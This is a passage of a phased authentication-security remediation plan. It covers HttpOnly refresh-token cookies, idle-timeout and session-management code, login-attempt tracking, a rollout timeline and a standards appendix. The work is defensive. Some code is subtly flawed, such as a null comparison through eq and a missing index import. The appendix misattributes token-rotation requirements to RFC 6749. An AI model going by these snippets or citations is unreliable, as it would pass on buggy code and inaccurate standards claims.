#### Test Case 3: Automatic Cookie Sending
```
1. Login to application
2. Open DevTools → Network tab
3. Make any API request
4. Click on request → Headers
5. Verify 'Cookie: refreshToken=xxx' in Request Headers
6. Verify automatic sending (no manual code needed)
```

#### Test Case 4: Token Refresh with HttpOnly Cookie
```
1. Login to application
2. Wait 16 minutes (access token expires)
3. Make any API call
4. Open DevTools → Network tab
5. Verify POST /api/auth/refresh request
6. Verify request includes 'Cookie: refreshToken=xxx'
7. Verify response sets new 'Set-Cookie: refreshToken=yyy'
8. Verify seamless refresh (user stays logged in)
```

### Security Improvements

**Before Phase 3:**
- ⚠️ Refresh token in localStorage (XSS vulnerable)
- ⚠️ Manual token management in JavaScript
- ⚠️ Token visible to any script on page

**After Phase 3:**
- ✅ Refresh token in HttpOnly cookie (XSS protected)
- ✅ Automatic cookie handling by browser
- ✅ Token invisible to JavaScript
- ✅ CSRF protection via SameSite=Strict
- ✅ Subdomain sharing (if configured)

### Deployment Checklist

- [ ] Server cookie configuration added to config
- [ ] Auth controller updated to set HttpOnly cookies
- [ ] Auth controller updated to read from cookies
- [ ] Client API client updated (removed localStorage)
- [ ] Client auth provider updated (single token parameter)
- [ ] Login pages updated (single token)
- [ ] All test cases passing
- [ ] XSS protection verified
- [ ] Cookie attributes verified (HttpOnly, Secure, SameSite)
- [ ] Cross-browser testing (Chrome, Firefox, Safari)
- [ ] CORS configuration allows credentials

### Estimated Effort

- **Server configuration:** 1 hour
- **Server controller updates:** 2-3 hours
- **Client API client updates:** 2-3 hours
- **Client auth provider updates:** 1-2 hours
- **Login page updates:** 1 hour
- **Testing:** 3-4 hours
- **Total:** 12-16 hours

---

## Phase 4: ADVANCED SECURITY FEATURES (16-24 hours)
### Priority: LOW - Enterprise-Grade Enhancements

**Goal:** Add enterprise-grade security features including idle timeout, session management, suspicious activity detection, and security audit logging.

### Features Overview

1. **Idle Timeout Warning** - Warn users before auto-logout due to inactivity
2. **Absolute Session Timeout** - Maximum session duration enforcement
3. **Device Management** - View and revoke sessions from other devices
4. **Suspicious Activity Detection** - Detect and block unusual login patterns
5. **Security Audit Log** - Comprehensive logging of auth events
6. **Remember Me** - Extended session option with security trade-offs

### 4.1: Idle Timeout Warning

**Implementation:**

#### Client-Side Activity Tracker
**File:** `client/src/hooks/useIdleTimeout.tsx` (new file)

```typescript
import { useEffect, useCallback, useRef, useState } from 'react';
import { useAuth } from './useAuth';

interface IdleTimeoutConfig {
  idleWarningTime: number; // Time before warning (ms)
  idleTimeoutTime: number; // Time before logout (ms)
  onIdle: () => void;
  onActive: () => void;
}

export function useIdleTimeout(config: IdleTimeoutConfig) {
  const { logout } = useAuth();
  const [isIdle, setIsIdle] = useState(false);
  const [showWarning, setShowWarning] = useState(false);
  const [timeRemaining, setTimeRemaining] = useState(0);
  
  const idleTimerRef = useRef<NodeJS.Timeout>();
  const warningTimerRef = useRef<NodeJS.Timeout>();
  const countdownIntervalRef = useRef<NodeJS.Timeout>();
  
  const resetTimers = useCallback(() => {
    // Clear existing timers
    if (idleTimerRef.current) clearTimeout(idleTimerRef.current);
    if (warningTimerRef.current) clearTimeout(warningTimerRef.current);
    if (countdownIntervalRef.current) clearInterval(countdownIntervalRef.current);
    
    setIsIdle(false);
    setShowWarning(false);
    
    // Set warning timer
    warningTimerRef.current = setTimeout(() => {
      setShowWarning(true);
      const warningDuration = config.idleTimeoutTime - config.idleWarningTime;
      setTimeRemaining(warningDuration);
      
      // Start countdown
      countdownIntervalRef.current = setInterval(() => {
        setTimeRemaining(prev => {
          if (prev <= 1000) {
            if (countdownIntervalRef.current) clearInterval(countdownIntervalRef.current);
            return 0;
          }
          return prev - 1000;
        });
      }, 1000);
      
      config.onActive();
    }, config.idleWarningTime);
    
    // Set idle timer
    idleTimerRef.current = setTimeout(() => {
      setIsIdle(true);
      setShowWarning(false);
      logout();
      config.onIdle();
    }, config.idleTimeoutTime);
  }, [config, logout]);
  
  useEffect(() => {
    const events = ['mousedown', 'mousemove', 'keypress', 'scroll', 'touchstart', 'click'];
    
    // Reset timers on user activity
    events.forEach(event => {
      document.addEventListener(event, resetTimers);
    });
    
    // Start timers
    resetTimers();
    
    // Cleanup
    return () => {
      events.forEach(event => {
        document.removeEventListener(event, resetTimers);
      });
      
      if (idleTimerRef.current) clearTimeout(idleTimerRef.current);
      if (warningTimerRef.current) clearTimeout(warningTimerRef.current);
      if (countdownIntervalRef.current) clearInterval(countdownIntervalRef.current);
    };
  }, [resetTimers]);
  
  return {
    isIdle,
    showWarning,
    timeRemaining,
    resetTimers,
  };
}
```

#### Idle Warning Modal Component
**File:** `client/src/components/IdleWarningModal.tsx` (new file)

```typescript
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from '@/components/ui/dialog';
import { Button } from '@/components/ui/button';

interface IdleWarningModalProps {
  open: boolean;
  timeRemaining: number;
  onContinue: () => void;
}

export function IdleWarningModal({ open, timeRemaining, onContinue }: IdleWarningModalProps) {
  const minutes = Math.floor(timeRemaining / 60000);
  const seconds = Math.floor((timeRemaining % 60000) / 1000);
  
  return (
    <Dialog open={open}>
      <DialogContent className="sm:max-w-md">
        <DialogHeader>
          <DialogTitle>Are you still there?</DialogTitle>
          <DialogDescription>
            You will be logged out in {minutes}:{seconds.toString().padStart(2, '0')} due to inactivity.
          </DialogDescription>
        </DialogHeader>
        <div className="flex justify-end gap-3 mt-4">
          <Button onClick={onContinue} variant="default">
            Stay Logged In
          </Button>
        </div>
      </DialogContent>
    </Dialog>
  );
}
```

### 4.2: Session Management & Device Tracking

#### Update Refresh Token Schema
**File:** `server/db/schema/refresh-tokens.schema.ts`

```typescript
// Add device tracking fields
export const refreshTokens = pgTable('refresh_tokens', {
  // ... existing fields ...
  
  // Device identification
  deviceId: text('device_id'), // Unique device fingerprint
  deviceName: text('device_name'), // User-friendly device name
  deviceType: text('device_type'), // desktop, mobile, tablet
  os: text('os'), // Operating system
  browser: text('browser'), // Browser name and version
  
  // Session metadata
  lastActivityAt: timestamp('last_activity_at').defaultNow(),
  loginLocation: text('login_location'), // City, Country from IP
});
```

#### Device Management Endpoint
**File:** `server/controllers/auth.controller.ts`

```typescript
/**
 * ✅ NEW: Get active sessions for current user
 */
async getActiveSessions(req: AuthenticatedRequest, res: Response) {
  try {
    const userId = req.user.id;
    
    const sessions = await db
      .select({
        id: refreshTokens.id,
        deviceName: refreshTokens.deviceName,
        deviceType: refreshTokens.deviceType,
        browser: refreshTokens.browser,
        os: refreshTokens.os,
        ipAddress: refreshTokens.ipAddress,
        loginLocation: refreshTokens.loginLocation,
        createdAt: refreshTokens.createdAt,
        lastActivityAt: refreshTokens.lastActivityAt,
      })
      .from(refreshTokens)
      .where(
        and(
          eq(refreshTokens.userId, userId),
          eq(refreshTokens.revokedAt, null as any),
          gt(refreshTokens.expiresAt, new Date())
        )
      )
      .orderBy(desc(refreshTokens.lastActivityAt));
    
    return this.sendSuccess(res, { sessions });
  } catch (error) {
    return this.handleError(res, error, 'AuthController.getActiveSessions');
  }
}

/**
 * ✅ NEW: Revoke specific session
 */
async revokeSession(req: AuthenticatedRequest, res: Response) {
  try {
    const { sessionId } = req.params;
    const userId = req.user.id;
    
    // Verify session belongs to user
    const [session] = await db
      .select()
      .from(refreshTokens)
      .where(
        and(
          eq(refreshTokens.id, sessionId),
          eq(refreshTokens.userId, userId)
        )
      )
      .limit(1);
    
    if (!session) {
      return this.sendError(res, 404, 'SESSION_NOT_FOUND', 'Session not found');
    }
    
    // Revoke session
    await db
      .update(refreshTokens)
      .set({
        revokedAt: new Date(),
        revokedReason: 'user_revoked',
      })
      .where(eq(refreshTokens.id, sessionId));
    
    return this.sendSuccess(res, { message: 'Session revoked successfully' });
  } catch (error) {
    return this.handleError(res, error, 'AuthController.revokeSession');
  }
}
```

### 4.3: Suspicious Activity Detection

#### Login Attempt Tracking
**File:** `server/db/schema/login-attempts.schema.ts` (new file)

```typescript
import { pgTable, text, timestamp, uuid, boolean } from 'drizzle-orm/pg-core';

export const loginAttempts = pgTable('login_attempts', {
  id: uuid('id').defaultRandom().primaryKey(),
  email: text('email').notNull(),
  ipAddress: text('ip_address').notNull(),
  userAgent: text('user_agent'),
  success: boolean('success').notNull(),
  failureReason: text('failure_reason'),
  attemptedAt: timestamp('attempted_at').defaultNow().notNull(),
  locationCity: text('location_city'),
  locationCountry: text('location_country'),
}, (table) => ({
  emailIdx: index('login_attempts_email_idx').on(table.email),
  ipIdx: index('login_attempts_ip_idx').on(table.ipAddress),
  attemptedAtIdx: index('login_attempts_attempted_at_idx').on(table.attemptedAt),
}));
```

#### Suspicious Activity Detector
**File:** `server/services/security/suspicious-activity.service.ts` (new file)

```typescript
import { BaseService } from '../base.service';
import { db } from '../../db';
import { loginAttempts } from '../../db/schema/login-attempts.schema';
import { eq, and, gte } from 'drizzle-orm';

export class SuspiciousActivityService extends BaseService {
  
  /**
   * Check for suspicious login patterns
   */
  async checkSuspiciousLogin(email: string, ipAddress: string): Promise<{
    isSuspicious: boolean;
    reason?: string;
  }> {
    const now = new Date();
    const oneHourAgo = new Date(now.getTime() - 60 * 60 * 1000);
    const oneDayAgo = new Date(now.getTime() - 24 * 60 * 60 * 1000);
    
    // Check 1: Too many failed attempts from this IP
    const failedAttemptsFromIp = await db
      .select()
      .from(loginAttempts)
      .where(
        and(
          eq(loginAttempts.ipAddress, ipAddress),
          eq(loginAttempts.success, false),
          gte(loginAttempts.attemptedAt, oneHourAgo)
        )
      );
    
    if (failedAttemptsFromIp.length >= 5) {
      return {
        isSuspicious: true,
        reason: 'Too many failed login attempts from this IP address',
      };
    }
    
    // Check 2: Too many failed attempts for this email
    const failedAttemptsForEmail = await db
      .select()
      .from(loginAttempts)
      .where(
        and(
          eq(loginAttempts.email, email),
          eq(loginAttempts.success, false),
          gte(loginAttempts.attemptedAt, oneHourAgo)
        )
      );
    
    if (failedAttemptsForEmail.length >= 5) {
      return {
        isSuspicious: true,
        reason: 'Too many failed login attempts for this account',
      };
    }
    
    // Check 3: Login from new location (if we have previous successful logins)
    const recentSuccessfulLogins = await db
      .select()
      .from(loginAttempts)
      .where(
        and(
          eq(loginAttempts.email, email),
          eq(loginAttempts.success, true),
          gte(loginAttempts.attemptedAt, oneDayAgo)
        )
      )
      .limit(10);
    
    if (recentSuccessfulLogins.length > 0) {
      const knownIps = new Set(recentSuccessfulLogins.map(l => l.ipAddress));
      if (!knownIps.has(ipAddress)) {
        // New IP - could be suspicious, but don't block (just flag for review)
        return {
          isSuspicious: false, // Allow but log
          reason: 'Login from new location',
        };
      }
    }
    
    return { isSuspicious: false };
  }
  
  /**
   * Log login attempt
   */
  async logLoginAttempt(
    email: string,
    ipAddress: string,
    userAgent: string | undefined,
    success: boolean,
    failureReason?: string
  ): Promise<void> {
    await db.insert(loginAttempts).values({
      email,
      ipAddress,
      userAgent,
      success,
      failureReason,
    });
  }
}

export const suspiciousActivityService = new SuspiciousActivityService();
```

### Testing Strategy for Phase 4

#### Test Case 1: Idle Timeout Warning
```
1. Login to application
2. Leave browser idle for configured warning time
3. Verify warning modal appears
4. Verify countdown timer is accurate
5. Click "Stay Logged In"
6. Verify warning dismisses and session continues
```

#### Test Case 2: Device Management
```
1. Login from Desktop Chrome
2. Login from Mobile Safari (same account)
3. From Desktop, navigate to Settings → Active Sessions
4. Verify both sessions are listed with device info
5. Click "Revoke" on Mobile Safari session
6. Verify Mobile Safari is logged out on next API call
```

#### Test Case 3: Suspicious Activity Detection
```
1. Attempt login with wrong password 5 times from same IP
2. Verify 6th attempt is blocked with "Too many attempts" error
3. Wait 1 hour (or use admin tool to clear)
4. Verify login is allowed again
```

### Estimated Effort

- **Idle timeout:** 3-4 hours
- **Device management:** 4-6 hours
- **Suspicious activity:** 4-6 hours
- **Security audit log:** 3-4 hours
- **Testing:** 4-6 hours
- **Total:** 16-24 hours

---

## Implementation Timeline & Rollout Strategy

### Recommended Rollout Order

```
Week 1: Phase 1 (IMMEDIATE)
├─ Day 1-2: Implement and test hotfix
├─ Day 3: Code review and QA
└─ Day 4: Deploy to production

Week 2-3: Phase 2 (SHORT-TERM)
├─ Day 1-2: Database schema and server implementation
├─ Day 3-4: Client implementation
├─ Day 5-6: Testing and bug fixes
└─ Day 7: Deploy to production

Week 4-5: Phase 3 (MEDIUM-TERM)
├─ Day 1-2: Server HttpOnly cookie implementation
├─ Day 3-4: Client localStorage removal
├─ Day 5-6: Testing and security audit
└─ Day 7: Deploy to production

Week 6+ (Optional): Phase 4 (LONG-TERM)
├─ Week 6: Idle timeout and session management
├─ Week 7: Suspicious activity detection
└─ Week 8: Security audit logging and final testing
```

### Risk Mitigation

**Phase 1 Risks:**
- **Risk:** Logging exposes token prefixes
- **Mitigation:** Only log in development, redact in production

**Phase 2 Risks:**
- **Risk:** Token refresh failures could lock users out
- **Mitigation:** Comprehensive error handling and fallback to re-login

**Phase 3 Risks:**
- **Risk:** HttpOnly cookies may not work in all environments (CORS, subdomains)
- **Mitigation:** Test thoroughly in staging with all client configurations

**Phase 4 Risks:**
- **Risk:** Idle timeout too aggressive could frustrate users
- **Mitigation:** Make timeout configurable, start with generous defaults

### Success Criteria

**Phase 1:**
- [ ] Users no longer logged out on page refresh (<1% failure rate)
- [ ] Diagnostic logs show clear auth flow
- [ ] No increase in legitimate auth failures

**Phase 2:**
- [ ] Automatic token refresh works seamlessly
- [ ] Users can stay logged in for 7 days without re-entering password
- [ ] Server-side token revocation working
- [ ] No more than 2% token refresh failures

**Phase 3:**
- [ ] Refresh tokens not accessible via JavaScript
- [ ] XSS attacks cannot steal refresh tokens
- [ ] All browsers support HttpOnly cookies correctly
- [ ] CSRF protection still working with cookies

**Phase 4:**
- [ ] Idle timeout warnings shown accurately
- [ ] Users can manage active sessions
- [ ] Suspicious login attempts blocked
- [ ] Security audit log captures all auth events

---

## Appendix: Industry Standards Reference

### OWASP Authentication Cheat Sheet
- Access tokens should be short-lived (15-60 minutes)
- Refresh tokens should be long-lived but revocable (7-30 days)
- Use HttpOnly cookies for sensitive tokens
- Implement CSRF protection with cookies
- Log all authentication events

### OAuth 2.0 RFC 6749
- Refresh tokens MUST be rotated on each use
- Refresh tokens MUST be bound to client (device tracking)
- Token revocation MUST be supported

### NIST 800-63B Digital Identity Guidelines
- Authenticators (tokens) SHALL have limited lifetime
- Sessions SHOULD timeout after period of inactivity
- Users SHOULD be warned before forced logout
- Suspicious activity SHOULD trigger additional verification

### Auth0 Best Practices
- Store tokens securely (HttpOnly cookies or secure storage)
- Never expose refresh tokens to client JavaScript
- Implement automatic token refresh
- Track login location and device for anomaly detection

---

## Conclusion

This remediation plan provides a comprehensive, phased approach to fixing the critical authentication issues while upgrading to industry-standard security patterns.

**Key Takeaways:**

1. **Phase 1 (IMMEDIATE)** fixes the critical logout bug with minimal risk
2. **Phase 2 (SHORT-TERM)** implements modern token refresh pattern
3. **Phase 3 (MEDIUM-TERM)** eliminates XSS vulnerability with HttpOnly cookies
4. **Phase 4 (LONG-TERM)** adds enterprise-grade security features

**Recommended Next Steps:**

1. Review this plan with the team
2. Allocate resources for Phase 1 implementation
3. Begin Phase 1 development immediately
4. Schedule Phases 2-3 based on team capacity
5. Evaluate Phase 4 features for business requirements

The phased approach allows for incremental improvements while maintaining system stability and minimizing deployment risk.
